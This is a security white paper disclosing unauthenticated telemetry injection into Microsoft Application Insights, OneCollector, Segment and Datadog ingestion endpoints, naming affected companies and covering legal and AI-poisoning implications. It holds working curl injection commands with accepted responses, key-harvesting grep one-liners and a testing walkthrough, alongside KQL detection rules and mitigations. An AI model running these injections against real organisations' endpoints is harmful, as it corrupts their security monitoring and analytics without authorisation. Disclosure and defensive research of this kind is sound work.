# The Telemetry Trust Crisis
Unauthenticated Telemetry Injection as a Systemic Architectural Risk Against Data Provenance, AI Training, and Security Operations

**Authors:** ek0ms savi0r & k3n · **Classification:** Public Disclosure
**Date:** September 5, 2026 · **CERT/CC Coordination:** September 5, 2026

## Acknowledgments

The authors wish to acknowledge the security researchers and practitioners who provided critical feedback on early drafts of this paper. Their insights helped refine the technical accuracy and framing of this work, particularly regarding the distinction between traditional vulnerabilities and architectural risk patterns. Any remaining errors or oversights remain our own.

## Executive Summary

This white paper documents a systemic architectural risk affecting the global telemetry infrastructure: the normalization of unauthenticated telemetry ingestion. Over the past several months, our research has identified that major technology platforms — including Microsoft (Azure Application Insights, OneCollector), Google, Meta, Apple, TikTok, LinkedIn, Segment, Datadog, and numerous others — operate telemetry ingestion endpoints that accept arbitrary data with only a static key (instrumentation key, write key, or client token) embedded in client-side JavaScript and therefore publicly exposed.

This is not a vulnerability in the traditional sense. These keys are explicitly documented by vendors as not being secrets and are not intended to provide authentication or access control. Rather, this is an architectural design choice that creates a trust boundary failure: telemetry ingestion endpoints accept data without verifying the identity or legitimacy of the source, allowing arbitrary injection of telemetry into organizational monitoring, analytics, and AI training pipelines.

The implications are significant:

- **Data Provenance Collapse:** Once an attacker can inject telemetry that is indistinguishable from legitimate data, the provenance (origin, authenticity, trustworthiness) of all telemetry becomes uncertain. Organizations can no longer trust their own monitoring data.
- **AI Training Data Poisoning (Potential):** Telemetry data is increasingly used to train AI models for security operations (AIOps), anomaly detection, and automated incident response. If organizations ingest unvalidated telemetry directly into training pipelines, injected telemetry can poison these datasets. While we have not confirmed this attack path in production environments, academic research has demonstrated the feasibility of telemetry-based AI poisoning, and the architecture enables this scenario.
- **Security Operations Blindness:** Security teams rely on telemetry for threat detection and incident response. Injected telemetry can create false alerts, hide real attacks, and corrupt forensic evidence — particularly if the injected data is not clearly distinguished from legitimate sources.
- **Business Intelligence Corruption:** Analytics platforms that ingest telemetry for business intelligence and user behavior analysis become unreliable, leading to incorrect business decisions.

This paper provides a complete walkthrough of the attack methodology, documents validated and reconnoitered exposures against multiple major vendors, and proposes mitigations for defenders. We emphasize that this paper describes an architectural risk pattern, not a bug in any specific product, and our findings should be interpreted in that context.

## 1. Introduction

### 1.1 The Telemetry Ecosystem

Modern digital infrastructure depends on telemetry. Every web application, mobile app, cloud service, and IoT device generates telemetry data that flows into centralized pipelines for monitoring, analytics, and AI training. This telemetry informs:

- **Security Operations:** SIEMs, EDRs, and XDRs ingest telemetry to detect and respond to threats.
- **AIOps:** Machine learning models analyze telemetry to detect anomalies and automate remediation.
- **Business Intelligence:** Analytics platforms use telemetry to understand user behavior and drive product decisions.
- **AI Training:** Telemetry datasets train models for security, anomaly detection, and automation.

### 1.2 The Design Trade-Off

Telemetry ingestion endpoints are designed to accept high volumes of data from diverse sources. To simplify integration and reduce latency, vendors allow ingestion using only a static key:

| Platform | Key Type | Endpoint Example |
|---|---|---|
| Microsoft Azure Application Insights | Instrumentation Key (iKey) | `dc.services.visualstudio.com/v2/track` |
| Microsoft OneCollector (1DS) | API Key | `*.events.data.microsoft.com/OneCollector/1.0/` |
| Segment | Write Key | `api.segment.io/v1/track` |
| Datadog RUM | Client Token | `rum.browser-intake-datadoghq.com/api/v2/rum` |

These keys are embedded in client-side JavaScript, mobile applications, and web pages. They are publicly exposed by design. As Microsoft states: "The instrumentation key cannot be used to read any telemetry. However, it could be used to send bogus telemetry to your application insights resource."

This statement reveals the core issue: the industry has normalized unauthenticated telemetry ingestion as an acceptable trade-off between security and convenience. We argue that this trade-off is increasingly dangerous as telemetry moves from simple monitoring to AI training and automated security operations.

### 1.3 The Scope of the Problem

Our research has identified and, where possible, validated this architectural risk across multiple platforms:

- **Microsoft:** Azure Application Insights, OneCollector (1DS), Power BI/Fabric telemetry pipelines
- **Google:** Multiple telemetry endpoints (identified via reconnaissance)
- **Meta:** Multiple telemetry endpoints (identified via reconnaissance)
- **Apple:** Multiple telemetry endpoints (identified via reconnaissance)
- **TikTok:** Multiple telemetry endpoints (identified via reconnaissance)
- **LinkedIn:** Multiple telemetry endpoints (identified via reconnaissance)
- **Segment:** Write key exposure allows arbitrary event injection (validated)
- **Datadog:** RUM client tokens allow arbitrary RUM event injection (validated)
- **CarMax:** Confirmed vulnerable via exposed iKeys (validated injection)
- **Flock Safety:** Confirmed vulnerable via Segment write key and Datadog RUM tokens (validated injection)

This is not a bug in any single product. This is a systemic architectural pattern across the entire telemetry industry that creates a trust boundary failure when telemetry is used for security-critical purposes.

## 2. The Attack: Unauthenticated Telemetry Injection

### 2.1 Attack Overview

The attack is simple: an attacker identifies an exposed telemetry key (iKey, write key, or client token) in client-side code, then sends arbitrary telemetry data to the corresponding ingestion endpoint.

Prerequisites:
- Publicly accessible ingestion endpoint (no IP restrictions)
- Valid key (exposed in client-side JavaScript or mobile app)
- Ability to send HTTP POST requests to the endpoint

No authentication, no authorization, no validation.

### 2.2 Finding Exposed Keys

Keys can be found in:
- **Browser JavaScript:** `view-source:https://example.com` → search for iKey, instrumentationKey, writeKey, clientToken
- **Mobile Applications:** Reverse-engineer APK/IPA files and search for key patterns
- **Network Traffic:** Monitor browser DevTools Network tab for telemetry requests
- **Public Code Repositories:** Search GitHub for exposed keys

Key patterns (values redacted in this public version):

| Platform | Key Pattern | Example (truncated) |
|---|---|---|
| App Insights | iKey GUID | `[REDACTED]` |
| OneCollector | API Key GUID-GUID-timestamp | `[REDACTED]` |
| Segment | Write Key alphanumeric | `[REDACTED]` |
| Datadog RUM | Token `pub` + hex | `[REDACTED]` |

### 2.3 Injection Methodology

Once a key is identified, the attacker constructs a telemetry payload matching the target platform's schema and sends it to the ingestion endpoint.

**Example 1: Microsoft Application Insights Injection**

```bash
curl -X POST "https://dc.services.visualstudio.com/v2/track" \
 -H "Content-Type: application/json" \
 -d '[{
 "time":"2026-07-29T15:40:00Z",
 "iKey":"<IKEY>",
 "name":"Microsoft.ApplicationInsights.<IKEY>.Event",
 "tags":{
 "ai.user.id":"INJECTED_USER",
 "ai.session.id":"INJECTED_SESSION"
 },
 "data":{
 "baseType":"EventData",
 "baseData":{
 "ver":2,
 "name":"INJECTED_EVENT",
 "properties":{
 "injected":"true",
 "marker":"[TELEMETRY_INJECTION_TEST]"
 }
 }
 }
 }]'
```

Response: `{"itemsReceived":1,"itemsAccepted":1,"errors":[]}`

**Example 2: Segment Injection** (write key redacted — `[REDACTED]`)

```bash
curl -X POST "https://api.segment.io/v1/track" \
 -H "Content-Type: application/json" \
 -H "Authorization: Basic <REDACTED>" \
 -d '{
 "userId":"injected-user",
 "event":"INJECTED_EVENT",
 "properties":{
 "injected":"true",
 "marker":"[TELEMETRY_INJECTION_TEST]"
 }
 }'
```

Response: `{"success": true}`

**Example 3: Datadog RUM Injection** (client token + app id redacted — `[REDACTED]`)

```bash
curl -X POST "https://rum.browser-intake-datadoghq.com/api/v2/rum" \
 -H "Content-Type: application/json" \
 -H "DD-API-KEY: <CLIENT_TOKEN>" \
 -H "DD-APPLICATION-ID: <APP_ID>" \
 -d '{
 "ddtags": "env:test",
 "application": {"id": "<APP_ID>"},
 "session": {"id": "injected-session"},
 "view": {"id": "injected-view", "url": "https://injected.example.com"},
 "action": {
 "type": "custom",
 "name": "INJECTED_ACTION",
 "properties": {"injected": "true"}
 }
 }'
```

Response: HTTP 202 Accepted

### 2.4 Payload Acceptance Testing

Our testing has confirmed that telemetry ingestion endpoints accept arbitrary string content across multiple fields. Note: this tests only whether the ingestion pipeline accepts payloads containing specific strings — not whether those strings cause downstream execution (e.g., XSS, SQL injection) in target environments. That would require separate research and is not claimed here.

| Payload Type | App Insights | OneCollector | Segment | Datadog RUM |
|---|---|---|---|---|
| Basic Event Injection | ✅ | ✅ | ✅ | ✅ |
| Bulk Injection (10/10) | ✅ | ✅ | ✅ | ✅ |
| Custom Properties | ✅ | ✅ | ✅ | ✅ |
| HTML Marker Payloads | ✅ | ✅ | ✅ | ✅ |
| Marker Text in User/Session IDs | ✅ | ✅ | ✅ | ✅ |
| Nested JSON (5+ levels) | ✅ | ✅ | ✅ | ✅ |
| Spoofed User/Session IDs | ✅ | ✅ | ✅ | ✅ |
| Spoofed Operation Names | ✅ | ✅ | ✅ | ✅ |

## 3. Data Provenance and the Mixing Problem

### 3.1 What is Data Provenance?

Data provenance refers to the documented history of data: where it came from, who created it, when it was created, and whether it can be trusted. In telemetry systems, provenance is essential for:
- **Security Investigations:** Determining whether an alert represents a real threat or a false positive
- **Forensic Analysis:** Understanding the timeline and source of an attack
- **Compliance:** Auditing data handling and ensuring regulatory compliance
- **AI Training:** Ensuring training data is authentic and representative

### 3.2 The Mixing Problem

When telemetry ingestion accepts unauthenticated data, the pipeline cannot distinguish between legitimate and injected telemetry. The two become mixed at the point of ingestion.

The mixing problem has three phases:
- **Ingestion Mixing:** Injected and legitimate telemetry enter the same pipeline, receive the same processing, and are stored in the same tables.
- **Storage Mixing:** Injected data is stored alongside legitimate data in Log Analytics workspaces, data lakes, and databases.
- **Consumption Mixing:** Injected data is consumed by dashboards, alerts, AI models, and business intelligence systems alongside legitimate data.

### 3.3 The Provenance Failure

Once data is mixed, provenance is lost. The system cannot reliably answer:
- Did this event come from the legitimate application or an attacker?
- Was this user session real or injected?
- Was this error genuine or fabricated?
- Should this data be used to train our AI models?

### 3.4 Real-World Example: CarMax

During our research, we identified two Application Insights instrumentation keys associated with CarMax in publicly delivered JavaScript (values redacted — `[REDACTED]`). We sent synthetic telemetry to `dc.services.visualstudio.com/v2/track` using these keys.

Response: `{"itemsReceived":1,"itemsAccepted":1,"appId":"b784cd90-1562-4630-bb8f-af8af0d05305","errors":[]}`

We confirmed the ability to control:
- Event names
- User and session identifiers
- Operation names and identifiers
- Custom properties
- HTML-like marker text
- Remote-dependency names, targets, and result codes
- Success states

The telemetry was accepted as legitimate. We do not have read access to CarMax's App Insights instance, so we cannot confirm downstream impact (storage, dashboards, AI training). However, the ingestion pipeline accepted the data without any indication that it was untrusted. The only barrier between an attacker and CarMax's telemetry pipeline is a static key exposed in JavaScript.

## 4. Regulatory and Legal Framework: Data Provenance Requirements

### 4.1 Overview of Applicable Laws

The telemetry injection condition described in this paper has significant implications for regulatory compliance. Organizations that collect, process, and store telemetry data are subject to various data protection and privacy laws that require data accuracy, integrity, and provenance. The inability to distinguish between legitimate and injected telemetry directly impacts compliance with these frameworks.

Telemetry data often contains personal information, user identifiers, session data, IP addresses, device fingerprints, and behavioral patterns — all of which fall within the scope of data protection regulations. When attackers inject telemetry, they are not merely polluting analytics pipelines; they are potentially introducing unverified, fabricated, or malicious personal data into systems that are legally required to maintain data accuracy and integrity.

### 4.2 Federal Trade Commission (FTC) Act

Section 5 of the FTC Act (15 U.S.C. § 45) prohibits unfair or deceptive acts or practices in or affecting commerce. The FTC has broad authority to enforce data privacy and security standards, and has brought numerous enforcement actions against companies that:
- Made false or misleading statements about data collection and use practices
- Failed to implement reasonable security measures to protect consumer data
- Engaged in deceptive practices related to data handling

Telemetry injection implications:
- Organizations that accept unauthenticated telemetry without validation may be engaging in deceptive practices if they represent to consumers that their data is collected and used for specific purposes, but fail to ensure the integrity of that data; make claims about the accuracy of their analytics or security monitoring while relying on potentially poisoned data; or fail to disclose that telemetry data may be compromised or fabricated.

The FTC's enforcement actions against companies like Cambridge Analytica, Equifax, and Facebook demonstrate that the agency takes data integrity and security seriously. Organizations that rely on telemetry for business decisions, security monitoring, or consumer-facing products could face FTC scrutiny if they fail to implement reasonable safeguards against telemetry injection.

Case law and guidance:
- *FTC v. Wyndham Worldwide Corp.* (2015) established that failing to implement reasonable security measures constitutes an unfair practice under Section 5.
- The FTC's "Start with Security" guidance emphasizes that companies should "secure data throughout its lifecycle" and "control access to data sensibly."
- The FTC's 2021 Policy Statement on Deceptive Acts reinforces that companies must not misrepresent their data practices, including data accuracy and integrity.

### 4.3 General Data Protection Regulation (GDPR)

The GDPR (Regulation (EU) 2016/679) imposes strict requirements on data controllers and processors regarding the accuracy, integrity, and processing of personal data.

**Article 5(1)(d) — Accuracy.** Personal data must be "accurate and, where necessary, kept up to date; every reasonable step must be taken to ensure that personal data that are inaccurate, having regard to the purposes for which they are processed, are erased or rectified without delay."
- If injected telemetry contains fabricated personal data (e.g., user IDs, session IDs, device identifiers), organizations are processing inaccurate personal data.
- Organizations must take "every reasonable step" to ensure data accuracy — including validating telemetry sources before ingestion.

**Article 5(1)(f) — Integrity and confidentiality.** Personal data shall be processed in a manner that ensures appropriate security, including protection against unauthorised or unlawful processing.
- Telemetry injection constitutes unauthorised processing of personal data where the events contain personal data.
- Failure to implement authentication and validation for telemetry ingestion may mean the organization is not providing "appropriate technical or organisational measures."

**Article 32 — Security of processing.** Controllers must implement measures appropriate to risk ensuring ongoing confidentiality, integrity, availability, and resilience.
- Inability to distinguish legitimate from injected telemetry undermines integrity of processing systems.
- Provenance tracking should be considered an "appropriate technical measure."

**Articles 33/34 — Breach notification.** Notification duties may arise if telemetry injection constitutes a personal-data breach creating risk to individuals; internal tracing is required to determine applicability.

**Potential fines:** up to €20M or 4% of global annual turnover for the most severe infringements; €10M or 2% for less severe (Article 83).

### 4.4 California Consumer Privacy Act (CCPA) and California Privacy Rights Act (CPRA)

- **§ 1798.100(a) (access):** Injected telemetry containing fabricated personal information creates confusion in responding to consumer access requests.
- **§ 1798.100(b) (notice):** Injection for undisclosed purposes could constitute unauthorised processing.
- **§ 1798.100(c) / CPRA security:** Failure to authenticate telemetry sources and validate integrity may fail the "reasonable security procedures and practices" requirement; injection constitutes unauthorised modification of personal information.
- **§ 1798.105(d) (deletion):** Inability to reliably identify all instances of a consumer's information due to injection may impede deletion compliance.
- **Penalties:** civil penalties up to $7,500 per intentional violation (§ 1798.155); private right of action for certain breaches (§ 1798.150).

### 4.5 Other Relevant State Laws

- **Virginia VCDPA, Colorado CPA, Connecticut CTDPA, Utah UCPA:** reasonable security + data accuracy duties.
- **Illinois BIPA:** biometric data in telemetry (face scans, voiceprints) subject to strict consent/retention rules.
- **New York SHIELD Act:** reasonable safeguards with private right of action.
- **HIPAA:** telemetry containing PHI could make injection a HIPAA breach.
- **COPPA:** telemetry from children under 13 subject to parental consent + data handling rules.
- **GLBA:** financial institutions' telemetry subject to safeguards rules.

### 4.6 International Laws

LGPD (Brazil), PIPEDA (Canada), Privacy Act 1988 (Australia), APPI (Japan), POPIA (South Africa) — all impose reasonable security and/or data-accuracy duties relevant to telemetry provenance.

### 4.7 Legal Liability and Enforcement Risk

| Law | Key Requirement | Telemetry Injection Impact | Potential Penalties |
|---|---|---|---|
| FTC Act | No unfair/deceptive practices | Failing to validate telemetry could be viewed as deceptive practice | Up to $40,000+ per violation |
| GDPR | Data accuracy, integrity, security | Art 5(1)(d), 5(1)(f), 32 considerations | Up to €20M or 4% global turnover |
| CCPA/CPRA | Data accuracy, security, consumer rights | Security + accuracy considerations | $7,500/violation; $750/consumer |
| BIPA | Biometric data protection | Unauthorized collection/processing of biometric data | $5,000/violation |
| HIPAA | PHI protection | Unauthorized PHI modification/disclosure | $50,000+/violation |
| COPPA | Children's data protection | Unauthorized collection of children's data | $40,000+/violation |
| GLBA | Financial privacy and security | Data integrity compromise | Varies by regulator |

Enforcement examples: *FTC v. Equifax* ($575M settlement); GDPR fines against British Airways (€20M), Marriott (€23M), Meta (€1.2B).

> **Caveat (from the legal annex on this site):** none of this establishes a violation merely because an endpoint accepted an event. Applicability depends on actual retention, attribution to identifiable persons, downstream use, and the organization's representations. Do not cite these laws as automatically triggered without vendor-side tracing.

### 4.8 Compliance Recommendations

Organizations collecting telemetry data should consider:
- Conducting a DPIA (GDPR Art. 35) for telemetry ingestion systems.
- Implementing technical measures: cryptographic signing at the source; provenance tracking for all events; regular audits for injected data.
- Updating privacy policies/notices to describe telemetry types, security measures, and accuracy/integrity practices.
- Maintaining a data inventory mapping collection points and flows.
- Responding to consumer requests with procedures robust to injected data; deleting injected telemetry on request.
- Breach preparedness: detect/respond procedures; determine whether injection is notifiable; prepare templates.

## 5. AI Training Implications (Potential Risk)

### 5.1 Telemetry as AI Training Data

Telemetry is increasingly used to train AI models for security operations (AIOps), anomaly detection, user behavior analytics, and predictive maintenance.

### 5.2 Data Poisoning as a Theoretical Attack

Data poisoning is a class of attack where an adversary injects malicious data into a training dataset to corrupt the resulting model. Injected telemetry could, in theory, poison training data, causing the model to learn false patterns:
1. Attacker identifies an exposed telemetry key.
2. Attacker injects malicious telemetry mimicking legitimate data but containing adversarial patterns.
3. If the injected data is stored and used to train AI models without provenance filtering, the model learns the adversarial patterns.
4. The model may then fail when faced with real attacks.

### 5.3 AIOps-Specific Risks (Academic Research)

Research (incl. RSAC Labs / George Mason University work described as "AIOpsDoom") demonstrated that AIOps tools could be manipulated via poisoned telemetry — reconnaissance, fuzzing accepted fields, generating adversarial payloads, and influencing agent behavior (false negatives, false positives, actions that compromise infrastructure integrity).

### 5.4 Important Caveat: The Gap Between Theory and Practice

We have **not confirmed** that any organization is directly feeding raw, unvalidated telemetry into production AI training pipelines without preprocessing, provenance checks, or sanitization. However:
- Academic research has demonstrated that telemetry-based AI poisoning is theoretically feasible.
- The architectural capability (unauthenticated injection) exists across major platforms.
- Industry trends toward automated ML retraining increase potential impact.
- Many organizations lack provenance tracking in their telemetry pipelines.

We recommend organizations audit their AI training pipelines to ensure telemetry data is validated and provenance-tracked before use in model training.

## 6. Walkthrough: Finding and Testing Unauthenticated Telemetry Injection

This section provides a step-by-step guide for identifying and testing unauthenticated telemetry injection endpoints. Provided for defensive purposes and authorized security testing only.

### 6.1 Reconnaissance

**Step 1: Identify telemetry endpoints.** Common patterns:

| Service | Endpoint Pattern |
|---|---|
| Azure Application Insights | `*.in.applicationinsights.azure.com/v2.1/track` |
| Azure Application Insights (legacy) | `dc.services.visualstudio.com/v2/track` |
| OneCollector (1DS) | `*.events.data.microsoft.com/OneCollector/1.0/` |
| Segment | `api.segment.io/v1/track` |
| Datadog RUM | `rum.browser-intake-datadoghq.com/api/v2/rum` |

Search for endpoints in JavaScript:

```bash
curl -s https://example.com | grep -oE 'https?://[^"]*/(v2/track|OneCollector/1.0/|v1/track)'
```

**Step 2: Identify keys** (all values redacted in this public version):

```bash
# GUID pattern (App Insights iKey)
curl -s https://example.com | grep -oE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' | head -20
curl -s https://example.com | grep -oE 'iKey["\s:]+["\']?[a-f0-9-]{36}'
curl -s https://example.com | grep -oE 'writeKey["\s:]+["\']?[A-Za-z0-9]{32,}'
```

### 6.2 Key Validation

Once a key is found, validate it by sending a minimal telemetry payload (placeholder key below — substitute only with a key you are authorized to test):

```bash
curl -X POST "https://dc.services.visualstudio.com/v2/track" \
 -H "Content-Type: application/json" \
 -d '[{"time":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'","iKey":"<IKEY>","name":"Microsoft.ApplicationInsights.<IKEY>.Event","data":{"baseType":"EventData","baseData":{"ver":2,"name":"ValidationTest"}}}]' \
 -w "\nHTTP %{http_code}\n" 2>/dev/null
```

Expected: 200 with `itemsAccepted:1` → key valid; 400 → invalid/format; 401/403 → restricted (unlikely for ingestion).

### 6.3 Injection (authorized targets only)

Basic event injection, bulk injection (rate-limit check), and payload-marker injection examples follow the same shapes as Section 2.3, using `<IKEY>` placeholders and `[TELEMETRY_INJECTION_TEST]` markers. Prefer unique harmless canary markers over destructive payload strings; stop once ingestion is demonstrated (see whitepaper §"Researcher responsibility").

### 6.4 Post-Injection Analysis

Without read access to the target telemetry instance, downstream impact cannot be confirmed. Indicators of successful injection: HTTP 200/202, no schema errors, bulk acceptance. What cannot be confirmed without read access: permanent storage, dashboard/alert appearance, AI-training use, downstream consumption.

## 7. Affected Vendors and Real-World Impact

### 7.1 Threat Model

| Attacker Type | Injection Goal | Realistic Impact | Scale |
|---|---|---|---|
| Competitor | Corrupt business intelligence / user analytics | Incorrect business decisions | Low–Medium |
| Malicious Insider | Frame users, create false alerts | Operational disruption | Low |
| APT / Nation-State | Hide real attacks, poison security monitoring | Delayed breach detection, corrupted evidence | High |
| Criminal (Financial) | Manipulate fraud detection/gaming metrics | Financial fraud | Medium |
| Prankster / Script Kiddie | Garbage data injection | Dashboard noise, alert fatigue | Low |
| Data Poisoning (Theoretical) | Corrupt AI models over time | Systematic model failure | High |

The most severe risks: APT-level actors concealing real attacks, and theoretical long-horizon data poisoning of AI models.

### 7.2 Validated Injection (Tier 1)

Confirmed ability to inject telemetry and receive an acceptance response:

| Vendor | Service | Vector | Status |
|---|---|---|---|
| Microsoft | App Insights | Unauthenticated injection via iKey | ✅ Validated |
| Microsoft | OneCollector | Unauthenticated injection with client-id=NO_AUTH | ✅ Validated |
| Segment | Analytics | Write key injection | ✅ Validated |
| Datadog | RUM | Client token injection | ✅ Validated |
| CarMax | App Insights | iKey injection | ✅ Validated |
| Flock Safety | Segment/Datadog | Key injection | ✅ Validated |

### 7.3 Key Exposure Confirmed (Tier 2)

Identified exposed telemetry keys/endpoints, injection not validated:

| Vendor | Service | Status |
|---|---|---|
| Google | Various telemetry endpoints | Key exposure confirmed |
| Meta | Various telemetry endpoints | Key exposure confirmed |
| Apple | Various telemetry endpoints | Key exposure confirmed |
| TikTok | Various telemetry endpoints | Key exposure confirmed |
| LinkedIn | Various telemetry endpoints | Key exposure confirmed |

### 7.4 Real-World Impact Summary

| Vendor | Service | Vector | Confirmed | Severity |
|---|---|---|---|---|
| Microsoft | App Insights | Unauthenticated injection via iKey | ✅ Validated | TBD |
| Microsoft | OneCollector | Unauthenticated injection with NO_AUTH | ✅ Validated | TBD |
| Segment | Analytics | Write key injection | ✅ Validated | HIGH |
| Datadog | RUM | Client token injection | ✅ Validated | HIGH |
| CarMax | App Insights | iKey injection | ✅ Validated | TBD |
| Flock Safety | Segment/Datadog | Key injection | ✅ Validated | TBD |
| Google | Various | Telemetry injection | 🔍 Reconnaissance | HIGH |
| Meta | Various | Telemetry injection | 🔍 Reconnaissance | HIGH |
| Apple | Various | Telemetry injection | 🔍 Reconnaissance | HIGH |
| TikTok | Various | Telemetry injection | 🔍 Reconnaissance | HIGH |
| LinkedIn | Various | Telemetry injection | 🔍 Reconnaissance | HIGH |

## 8. Mitigations and Recommendations

### 8.1 Recommendations for Defenders

**Immediate actions:**
- Disable local authentication on telemetry ingestion endpoints and require Entra ID (Azure AD) authentication where supported.
- Rotate exposed keys immediately; do not embed keys in client-side code where avoidable.
- Implement IP restrictions on ingestion endpoints where possible.
- Monitor for anomalous telemetry patterns (unexpected event names, high volume from a single source, marker patterns).

**Detection rules (KQL for Azure App Insights):**

```kql
// Detect potential telemetry injection — unusual event names
customEvents
| where timestamp > ago(24h)
| where name contains "INJECTED"
  or name contains "TEST"
  or name matches regex @"[A-Z]{10,}"
| summarize Count = count() by name, user_Id, session_Id
| where Count > 100
| project timestamp, name, user_Id, session_Id, Count

// Detect potential telemetry injection — suspicious properties
customEvents
| where timestamp > ago(24h)
| where properties has "marker"
  or properties has "test"
  or properties has "inject"
| project timestamp, name, properties, user_Id, session_Id
```

**Long-term actions:**
- Redesign telemetry ingestion with cryptographic signing to ensure provenance.
- Implement provenance tracking at ingestion time to distinguish trusted from untrusted sources.
- Sanitize telemetry before AI training using provenance validation.
- Conduct regular audits of telemetry pipelines for unauthorized injection.

### 8.2 Vendor-Specific Mitigation Guidance

- **Microsoft Application Insights:** enable Entra ID authentication; customer-managed keys; instrumentation validation.
- **Segment:** review write-key exposure in client-side code; server-side tracking for sensitive analytics; anomaly filtering.
- **Datadog:** review RUM client-token exposure; IP allowlisting; monitor for suspicious RUM events.

### 8.3 Recommendations for Vendors

Treat instrumentation keys as credentials and require rotation; make authentication mandatory by default; provide clear guidance on securing telemetry ingestion; implement provenance tracking; add cryptographic signatures at the source.

### 8.4 Reference Architecture: Secure Telemetry Ingestion

```
[Application] → [Signed Telemetry] → [Ingestion Gateway] → [Provenance Validation] → [Telemetry Pipeline]
                                          ↑                       ↓
                                    [Private Key]        [Validation Service]
```

- **Signed Telemetry:** applications sign events with a private key.
- **Ingestion Gateway:** validates signatures before forwarding.
- **Provenance Validation:** tags events with trust level (authentic, unverified, suspicious).
- **Telemetry Pipeline:** routes events based on trust level.

This architecture ensures that even if injection occurs, downstream consumers can distinguish trusted from untrusted telemetry.

### 8.5 The Path Forward

The industry must recognize that telemetry is not a trusted source of truth. Telemetry ingestion must be treated as an attack surface, not a trusted input channel. Defense priorities: authentication (mandatory for all ingestion), provenance (cryptographic), sanitization (before AI models), monitoring (continuous). The September 5, 2026 disclosure of this research is intended to drive this conversation forward.

## Appendix A: Vendor-Specific Injection Payloads (authorized testing only; placeholder keys)

Payload skeletons for Microsoft App Insights, OneCollector, Segment, and Datadog RUM follow the Section 2.3 shapes with `<IKEY>`, `<APIKEY>`, `<WRITE_KEY>`, `<CLIENT_TOKEN>`, `<APP_ID>` placeholders. **Do not substitute real keys unless you are authorized to test that target.** Use unique harmless canary markers; stop after ingestion is demonstrated.

## Appendix B: Disclosure Timeline

| Date | Event |
|---|---|
| June 6, 2026 | Initial disclosure to Microsoft MSRC (VULN-193698) |
| June 9, 2026 | MSRC Case 121314 opened |
| July 6, 2026 | OneCollector vulnerability disclosed (VULN-200045) |
| July 29, 2026 | CarMax third-party validation confirmed |
| August 2026 | Segment and Datadog findings confirmed |
| September 5, 2026 | Public disclosure / CERT/CC coordination |

**Note on named organizations:** CarMax and Flock Safety were notified prior to publication. All identified keys have been redacted in this public version. Organizations seeking validation of their exposure should contact the authors directly.

## Appendix C: References

- Microsoft Application Insights security guidance
- Application Insights instrumentation key exposure documentation
- Segment write key exposure guidance
- Datadog RUM injection documentation
- AIOps telemetry manipulation research (AIOpsDoom)
- Model telemetry poisoning research
- Telemetry provenance and trust
- FTC Act Section 5; GDPR; CCPA/CPRA; FTC data security guidance

---

**Authors:** ek0ms savi0r & k3n · **Date:** September 5, 2026
**Contact:** via CERT/CC for questions or security disclosures.

This paper is intended to promote discussion about architectural security in telemetry systems. The findings described herein are based on publicly available information and independent research. Organizations are encouraged to assess their own telemetry pipelines and implement appropriate security controls.
